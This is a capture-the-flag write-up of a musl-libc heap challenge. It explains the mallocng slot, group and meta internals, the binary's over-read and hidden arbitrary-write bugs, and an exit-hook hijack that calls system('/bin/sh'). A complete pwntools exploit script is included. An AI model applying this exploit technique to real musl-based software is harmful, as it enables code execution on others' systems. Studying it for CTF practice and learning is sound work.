---
title: atypical-heap-revenge
published: 2026-03-09
description: "A heap Pwn Challenge with musl"
tags: ["Pwn", "Heap", "Musl"]
image: "glt_gruvbox.png"
category: Pwn
draft: false
---

# Preface
Hello This is my first time trying to pwn a heap challenge with musl libc and I will try to explain this detaily as possible, So that it can be used as an reference in the future.

## First Look
At first look I thought, It is a Usual Heap Explotation with the Glibc, But later i Realised It is not.

```shellsession
┌──(hyder㉿xhyder)-[~/unbreakable_26/pwn/chal1/dist]
└─$ file chall 
chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-musl-x86_64.so.1, not stripped
                                                                                                                                                 
┌──(hyder㉿xhyder)-[~/unbreakable_26/pwn/chal1/dist]
└─$ file libc.so 
libc.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=8210de7c5b1b51b3656531b07280d32b15b00cce, not stripped
                                                                                                                            
┌──(hyder㉿xhyder)-[~/unbreakable_26/pwn/chal1/dist]
└─$ checksec chall 
[*] '/home/hyder/unbreakable_26/pwn/chal1/dist/chall'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
                                            
```
Then I made the elf to use the musl lib for the challenge. 

## BUG

### chall.c
```c  wrap=true showLineNumbers=true
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <err.h>

#ifdef DEBUG
#define DPRINT(...) do { \
    fprintf(stderr, __VA_ARGS__); \
} while(0)
#else
#define DPRINT(...)
#endif

#define NOTES_SIZE 0x50
#define MAX_NOTE_SIZE 0x100

#define NOTE_ALLOC 1
#define NOTE_FREE 2
#define NOTE_WRITE 3
#define NOTE_READ 4
#define NOTE_MAGIC 5
#define NOTE_EXIT 6


struct note {
    char* data;
    size_t size;
};

struct note notes[NOTES_SIZE] = { {NULL, 0} };

void __attribute__((constructor)) init() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
}

void menu(void) {
    puts("1. Allocate note");
    puts("2. Free note");
    puts("3. Write note");
    puts("4. Read note");
    puts("5. Exit");
    printf("> ");
}

unsigned int get_idx(){
    unsigned int idx;
    
    printf("index: ");

    if(scanf("%u", &idx) != 1)
        errx(1, "invalid input");

    if (idx >= NOTES_SIZE)
        errx(1, "invalid index");

    return idx;
}
    
int main(){
    unsigned int idx, sz, choice, magic_used = 0;
    unsigned long* ptr;
    unsigned long value = 0;


    for(;;){
        menu();
        if (scanf("%u", &choice) != 1) {
            errx(1, "invalid input");
        }

        switch (choice) {
            case NOTE_ALLOC:
                idx = get_idx();
                if (notes[idx].data != NULL) {
                    puts("note already allocated");
                    break;
                }
                
                printf("Enter size: ");
                if(scanf("%u", &sz) != 1)
                    errx(1, "invalid input");
                
                if (sz > MAX_NOTE_SIZE) {
                    puts("invalid size");
                    break;
                }

                notes[idx].data = malloc(sz);
                notes[idx].size = sz;
                
                DPRINT("malloc: %p\n", notes[idx].data);

                if (notes[idx].data == NULL)
                    errx(1, "failed to allocate memory");
                
                break;
            case NOTE_FREE:
                idx = get_idx();

                if (notes[idx].data == NULL) {
                    puts("note not allocated");
                    break;
                }
                
                free(notes[idx].data);
                notes[idx].data = NULL;
                notes[idx].size = 0;
                break;
            case NOTE_WRITE:
                idx = get_idx();
                
                if(notes[idx].data == NULL) {
                    puts("note not allocated");
                    break;
                }

                printf("size: ");
                if (scanf("%u", &sz) != 1)
                    errx(1, "invalid input");

                if (sz > notes[idx].size) {
                    puts("invalid size");
                    break;
                }

                printf("data: ");
                read(0, notes[idx].data, sz);

                break;
            case NOTE_READ:
                idx = get_idx();
                
                printf("size: ");
                if (scanf("%u", &sz) != 1)
                    errx(1, "invalid input");
                
                if (sz > MAX_NOTE_SIZE) {
                    puts("invalid size");
                    break;
                }

                if (notes[idx].data == NULL) {
                    puts("note not allocated");
                    break;
                }
                write(1, notes[idx].data, sz);

                break;
            case NOTE_MAGIC:
                if(!magic_used)
                    magic_used = 1;
                
                printf("address: ");
                scanf("%p", &ptr);

                if(((unsigned long)ptr & 7) != 0)
                    errx(1, "invalid address");

                printf("value: ");
                scanf("%lu", &value);

                *ptr = value;
                break;
            case NOTE_EXIT:
                exit(0);
            default:
                puts("Invalid choice");
        }
    }
    return 0;
}
```
### Arbitary read
This is classic heap implementation with CRUD operation but from looking at the source code, we can see that we can read arbirary amount of size as the size chack here shoud be `if (sz > notes[idx].size)` instead of `if (sz > MAX_NOTE_SIZE)` , as even if the malloc size is small , it lets read data from memory upto 0x100, Which we can use to leak memory addresses.

```c
case NOTE_READ:
    idx = get_idx();
                
    printf("size: ");
    if (scanf("%u", &sz) != 1)
        errx(1, "invalid input");
                
    if (sz > MAX_NOTE_SIZE) {
        puts("invalid size");
        break;
    }

    if (notes[idx].data == NULL) {
        puts("note not allocated");
        break;
    }
    write(1, notes[idx].data, sz);

    break;
```
### Magic function
Then we have an another unique magic function, that is hidden from the menu of case 5, that lets user to write any data to any memory in the process.
This gives us arbitary write to any memory in the program as long as the address is valid and is 8 byte alligned.
```c
case NOTE_MAGIC:
    if(!magic_used)
        magic_used = 1;
                
    printf("address: ");
    scanf("%p", &ptr);

    if(((unsigned long)ptr & 7) != 0)
        errx(1, "invalid address");

    printf("value: ");
    scanf("%lu", &value);

    *ptr = value;
    break;
```

## Understanding musl heap
Unlink the GLibc which uses ptmalloc, musl uses mallocng, which is quite different implementation from the Glibc one. Lets see how the interals looks like here,

### Slot
musl stores has the metadata and user data as chunk and in musl that is known as a slot , where we slot has it own corresponding metadata and respective user data.
The size of the metadata is 16 bytes , where there are two bytes that are important here which gives us offset and index of the slot here.
```gdb wrap=false showLineNumbers=false
pwndbg> x/20gx 0x00007ffff7ffece0-16
0x7ffff7ffecd0: 0x0000555555559158      0x000080000000000e
0x7ffff7ffece0: 0x4141414141414141      0x0000000a41414141
0x7ffff7ffecf0: 0x0000000000000000      0x0002810000000000
0x7ffff7ffed00: 0x4242424242424242      0x00000000000a4242
pwndbg> p/d 0x80 & 31
$1 = 0
pwndbg> p/d 0x81 & 31
$8 = 1
pwndbg> 

```
In here, At that address `0x7ffff7ffecd8`, 2nd byte is offset and 3rd byte is index, As max index is 32, so it does idx & 31, to find the index of the slot.

### Group
Then group is noting but the collection of Slots, instead of managing slots individually , it uses group to handle the slots here.
then each group has a overall meta data at the start of first slot, as that is used by allocator to keep track the status of the each group in the runtime.

Then allocator uses a formula to track the metadata for each slot in the different position in the memory :     
        `Formula : p - offset * unit` , where  unit is usually 16 bytes.

```gdb
pwndbg> x/20gx 0x00007ffff7ffece0-16
0x7ffff7ffecd0: 0x0000555555559158      0x000080000000000e
0x7ffff7ffece0: 0x4141414141414141      0x0000000a41414141
0x7ffff7ffecf0: 0x0000000000000000      0x0002810000000000
0x7ffff7ffed00: 0x4242424242424242      0x00000000000a4242
pwndbg> p/x 0x7ffff7ffed00 - 0x20
$13 = 0x7ffff7ffece0
pwndbg>  /* as 2 * 16 is 32(0x20) here

```
This helps the allocator to easily find the metadata of the group for each slot.

### meta
```c
struct meta {
	struct meta *prev, *next;
	struct group *mem;
	volatile int avail_mask, freed_mask;
	uintptr_t last_idx:5;
	uintptr_t freeable:1;
	uintptr_t sizeclass:6;
	uintptr_t maplen:8*sizeof(uintptr_t)-12;
};
```
The meta struct is the actual control center for that group. It uses bitmap approach to track memory.       
        `struct meta *prev, *next;`     
    * Every meta struct acts as a node in a doubly linked list, and each list exclusively contains meta structs of the exact same size class.
so prev and next are used to access the slots in the each group.        
        `struct group *mem;`        
    * A pointer that tells the allocator exactly where the actual memory for this group of slots is located. so simply it tells the metadata for the group.       
        `volatile int avail_mask, freed_mask;`      
    * avail_mask: Bits representing slots that have been reserved by the kernel but never given to a user via malloc().     
        * freed_mask: Bits representing slots that were used, but have been returned via free().        
        Then others are not important as of now.

### meta_area
```c
struct meta_area {
	uint64_t check;
	struct meta_area *next;
	int nslots;
	struct meta slots[];
};
```
It is security check to make sure that the assigned meta is valid and designed to stop attackers from forging fake heap chunks.        
So the core function here is that, It drops the last 12 bits(3 bytes) of the meta and check with the ASLR to verify the integrity of the meta used there to find if it is valid.

### malloc_context
It is the global, overarching data structure that oversees everything. Its primary job is to hold an array of pointers to the active meta structs, sorted by their sizeclass. When you ask for memory, the allocator checks __malloc_context first to find the right meta group to pull from.

### malloc and free 
When a malloc is invoked, It allocates to corresponding size field with the help of malloc_context that relates to the size field there.        
Then when free uses the slot's offset to securely locate and verify the meta struct, then flips its index bit in freed_mask to mark it available and also overwrites the slot's offset to 0xff, preventing double-frees.

## Leaking the memory
I felt struck for a while, as we already know we leak memory by arbitary read, but how ???      
Then it sparked to me , as we allocate maximum of 0x50 allocation, then we can simply fill the group then a new group is created then we can leak the metadata of that newly created group.

So initially looped to allocated and thought leak from it,
```python
for i in range(31):
    malloc(i,24)
    write(i,24,b'A'*24)

read(14,100) # 14 allocation to fill the slot
p.recv(32) # recv junk
leak = u64(p.recv(8).ljust(8,b'\x00'))
log.success(f'leak : {hex(leak)}')

meta_area = leak & ~0xfff
log.info(f"Meta Area Base: {hex(meta_area)}")
```
But wierdly enough, after 15 allocation the group got filled, Still need to look hard what is happening here to understand this benaviour.      

now we have a valid heap leak , where it is the meta data in the musl libc, Then I again felt struck that what can i do now, to do a proper exploit i need to have a libc here, we can just use that secret magic to make it happen, but what to write now with only the heap leak.     
Then after a long time debuging the metadata memory sections and I managed to overwrite the metadata of the slot address with a arbitary one in the heap, so any future allocation would take place in the heap memory and since heap memory is filled with all the group metadata and the  slot addresses we can leak that by arbitary read trick then with the slot address we can calulate the libc address here.

```python
malloc(0,24)
magic(write_addr2+16,target)
malloc(1,24)

read(1,100)
p.recv(16)
anon_leak = u64(p.recv(8).ljust(8,b'\x00'))
anon_base = anon_leak - 0x28c0
log.success(f'anon leak : {hex(anon_leak)}')

libc_address = anon_leak - 682176
log.success(f'libc base : {hex(libc_address)}')
```

## Exploitation
Since we cannot control return address here , As this program just exits, Then I begun to google for any hooks at the exit, luckly I managed to find a function that triggers at exit to check for any hook and runs it.
```gdb
pwndbg> disass
Dump of assembler code for function __funcs_on_exit:
=> 0x00007fc625792e79 <+0>:     push   rbp
   0x00007fc625792e7a <+1>:     lea    rdi,[rip+0x7815f]        # 0x7fc62580afe0 <lock>
   0x00007fc625792e81 <+8>:     push   rbx
   0x00007fc625792e82 <+9>:     sub    rsp,0x8
   0x00007fc625792e86 <+13>:    call   0x7fc6257b6976 <__lock>
   0x00007fc625792e8b <+18>:    mov    rdx,QWORD PTR [rip+0x77f36]        # 0x7fc62580adc8 <head>
   0x00007fc625792e92 <+25>:    jmp    0x7fc625792eee <__funcs_on_exit+117>
   0x00007fc625792e94 <+27>:    cdqe
   0x00007fc625792e96 <+29>:    lea    rdi,[rip+0x78143]        # 0x7fc62580afe0 <lock>
   0x00007fc625792e9d <+36>:    mov    rbp,QWORD PTR [rdx+rax*8+0x108]
   0x00007fc625792ea5 <+44>:    mov    rbx,QWORD PTR [rdx+rax*8+0x8]
   0x00007fc625792eaa <+49>:    call   0x7fc6257b6a27 <__unlock>
   0x00007fc625792eaf <+54>:    mov    rdi,rbp
   0x00007fc625792eb2 <+57>:    call   rbx
   0x00007fc625792eb4 <+59>:    lea    rdi,[rip+0x78125]        # 0x7fc62580afe0 <lock>
   0x00007fc625792ebb <+66>:    call   0x7fc6257b6976 <__lock>
   0x00007fc625792ec0 <+71>:    mov    rdx,QWORD PTR [rip+0x77f01]        # 0x7fc62580adc8 <head>
   0x00007fc625792ec7 <+78>:    mov    ecx,DWORD PTR [rip+0x78117]        # 0x7fc62580afe4 <slot>
   0x00007fc625792ecd <+84>:    lea    eax,[rcx-0x1]
   0x00007fc625792ed0 <+87>:    mov    DWORD PTR [rip+0x7810e],eax        # 0x7fc62580afe4 <slot>
   0x00007fc625792ed6 <+93>:    test   ecx,ecx
   0x00007fc625792ed8 <+95>:    jg     0x7fc625792e94 <__funcs_on_exit+27>
   0x00007fc625792eda <+97>:    mov    DWORD PTR [rip+0x78100],0x20        # 0x7fc62580afe4 <slot>
   0x00007fc625792ee4 <+107>:   mov    rdx,QWORD PTR [rdx]
   0x00007fc625792ee7 <+110>:   mov    QWORD PTR [rip+0x77eda],rdx        # 0x7fc62580adc8 <head>
   0x00007fc625792eee <+117>:   test   rdx,rdx
   0x00007fc625792ef1 <+120>:   jne    0x7fc625792ec7 <__funcs_on_exit+78>
   0x00007fc625792ef3 <+122>:   add    rsp,0x8
   0x00007fc625792ef7 <+126>:   pop    rbx
   0x00007fc625792ef8 <+127>:   pop    rbp
   0x00007fc625792ef9 <+128>:   ret
End of assembler dump.
pwndbg> 

```
This function `__funcs_on_exit`, check for any exit hooks at the runtime , when exit is triggered.
```c
struct fl {
    struct fl *next;      // 0x00
    void (*f[32])(void*); // 0x08
    void *a[32];          // 0x108
};
```
and Roughly this is how that function to hook looks like, So if we can create a structure similar to this.      
So with magic function I placed create a structure similar to it.
```python
magic(heap_base+0x200,0)
magic(heap_base+0x208,system)
magic(heap_base+0x200+0x108,binsh)
```
Then overwritten both the head and slot address there, so that it points to the fake structure that we created and executes it.
```python
magic(head,heap_base+0x200) # overwrite head
magic(slot-4,4294967296) # overwrte slot to 1 (-4 due to memory allignment)
```

Thus we can create a working exploit and pwned!!!!
```shellsession
└─$ python solve.py
[*] '/home/hyder/unbreakable_26/pwn/chal1/dist/chall'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
[+] Starting local process '/home/hyder/unbreakable_26/pwn/chal1/dist/chall': pid 114694
[+] leak : 0x560fb4894130
[*] Meta Area Base: 0x560fb4894000
p.sendlineafter(b'address: ',hex(ptr))
[+] anon leak : 0x7fa1064f08c0
[+] libc base : 0x7fa10644a000
[*] Switching to interactive mode
1. Allocate note
2. Free note
3. Write note
4. Read note
5. Exit
> $ ls
chall  chall.c  flag.txt  libc.so  solve.py
$ cat flag.txt
CTF{FAKE_FLAG}
$  

```


### Solve.py
```python
from pwn import *

elf = context.binary = ELF('./chall')
context.arch = 'amd64'
libc = './libc.so'

global p
'''
b*main+348
b*main+835
b*main+536
'''
gdbscript = f'''
b*main+1215
c
'''
if args.REMOTE:
    p = remote('34.89.194.19',31460)
elif args.GDB:
    p = gdb.debug([elf.path], gdbscript=gdbscript)
else:
        p = process([elf.path])

def malloc(idx,size):
        p.recvuntil(b'> ')
        p.sendline(b'1')
        p.sendlineafter(b'index: ',str(idx).encode())
        p.sendlineafter(b'Enter size: ',str(size).encode())
        return idx

def free(idx):
        p.recvuntil(b'> ')
        p.sendline(b'2')
        p.sendlineafter(b'index: ',str(idx).encode())
        return

def write(idx,size,data):
        p.recvuntil(b'> ')
        p.sendline(b'3')
        p.sendlineafter(b'index: ',str(idx).encode())
        p.sendlineafter(b'size: ',str(size).encode())
        p.sendlineafter(b'data: ',data)
        return 

def read(idx,size):
        p.recvuntil(b'> ')
        p.sendline(b'4')
        p.sendlineafter(b'index: ',str(idx).encode())
        p.sendlineafter(b'size: ',str(size).encode())
        return

def magic(ptr,val):
        p.recvuntil(b'> ')
        p.sendline(b'5')
        p.sendlineafter(b'address: ',hex(ptr))
        p.sendlineafter(b'value: ',str(val).encode())

for i in range(31):
    malloc(i,24)
    write(i,24,b'A'*24)

#raw_input('DEBUG')

read(14,100) # 14 allocation to fill the slot

p.recv(32) # recv junk

leak = u64(p.recv(8).ljust(8,b'\x00'))
log.success(f'leak : {hex(leak)}')

meta_area = leak & ~0xfff
log.info(f"Meta Area Base: {hex(meta_area)}")

for i in range(31):
    free(i)

heap_base = leak - 304
write_addr = leak + 16
target = heap_base + 0xb0
write_addr2 = heap_base + 0x158
#magic(target-16,p64(0))
#magic(target-8,p64(0))
magic(write_addr,target)
magic(write_addr2+16,target)

malloc(0,24)
magic(write_addr2+16,target)
malloc(1,24)

read(1,100)
p.recv(16)
anon_leak = u64(p.recv(8).ljust(8,b'\x00'))
anon_base = anon_leak - 0x28c0
log.success(f'anon leak : {hex(anon_leak)}')

libc_address = anon_leak - 682176
log.success(f'libc base : {hex(libc_address)}')

system = libc_address + 0x48368 
environ = anon_base + 0x1da0 
binsh = libc_address + 0xa0af3 
head = anon_base + 0x1dc8 
slot = anon_base + 0x1fe4

magic(heap_base+0x200,0)
magic(heap_base+0x208,system)
magic(heap_base+0x200+0x108,binsh)

magic(head,heap_base+0x200) # overwrite head
magic(slot-4,4294967296) # overwrte slot to 1 (-4 due to memory allignment)

p.sendline(b'6')
p.interactive()
```

## Reference
https://blog.kylebot.net/2021/05/08/DEFCON-2021-Quals-mooosl/ 
https://github.com/12101111/musl-malloc/tree/rpmalloc